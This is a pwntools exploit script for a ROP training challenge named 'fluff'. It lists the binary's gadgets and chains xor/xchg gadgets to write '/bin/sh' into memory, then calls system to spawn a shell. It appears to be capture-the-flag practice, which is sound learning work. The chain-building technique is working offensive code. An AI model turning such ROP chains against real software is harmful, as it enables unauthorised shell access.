from pwn import *
context(terminal = ["tmux", "new-window"])

p = gdb.debug("./fluff", gdbscript = '''
init-peda
b *0x4007ff
''')

context.log_level = "DEBUG"
#Dump of assembler code for function questionableGadgets:
#0x0000000000400820 <+0>:     pop    r15
#0x0000000000400822 <+2>:     xor    r11,r11
#0x0000000000400825 <+5>:     pop    r14
#0x0000000000400827 <+7>:     mov    edi,0x601050
#0x000000000040082c <+12>:    ret

#0x000000000040082d <+13>:    pop    r14
#0x000000000040082f <+15>:    xor    r11,r12
#0x0000000000400832 <+18>:    pop    r12
#0x0000000000400834 <+20>:    mov    r13d,0x604060
#0x000000000040083a <+26>:    ret

#0x000000000040083b <+27>:    mov    edi,0x601050
#0x0000000000400840 <+32>:    xchg   r11,r10
#0x0000000000400843 <+35>:    pop    r15
#0x0000000000400845 <+37>:    mov    r11d,0x602050
#0x000000000040084b <+43>:    ret

#0x000000000040084c <+44>:    pop    r15
#0x000000000040084e <+46>:    mov    QWORD PTR [r10],r11
#0x0000000000400851 <+49>:    pop    r13
#0x0000000000400853 <+51>:    pop    r12
#0x0000000000400855 <+53>:    xor    BYTE PTR [r10],r12b
#0x0000000000400858 <+56>:    ret

#0x0000000000400859 <+57>:    nop    DWORD PTR [rax+0x0]
#End of assembler dump.

junk = "A"*40
system_plt = p64(0x4005e0)
pop_rdi = p64(0x4008c3)
write_here = p64(0x6010f0)
pop_r12 =  p64(0x400832)
xor_r11_r11 = p64(0x400822)
xor_r11_r12 = p64(0x40082f)
xchg_r11_r10 = p64(0x400840)
mov_r10_r12 = p64(0x40084e)
sh = "/bin/sh\x00"
# so... first of all we set r11 to 0 (xor r11,r11), then we pop write in r12
# afer that, we xor r11,r12 .With r11 being 0, xoring is basically moving.
# we exchange r11 w/ r10, and then we move sh in r12. and that's it

payload = junk + xor_r11_r11 + p64(0) + pop_r12 + write_here + xor_r11_r12 + p64(0)+ xchg_r11_r10 + p64(0) + \
          xor_r11_r11 + p64(0) + pop_r12 + sh + xor_r11_r12 + p64(0) + \
          mov_r10_r12 + p64(0) + p64(0)+ pop_rdi + write_here + system_plt
p.recvuntil("> ")
p.sendline(payload)
p.interactive()
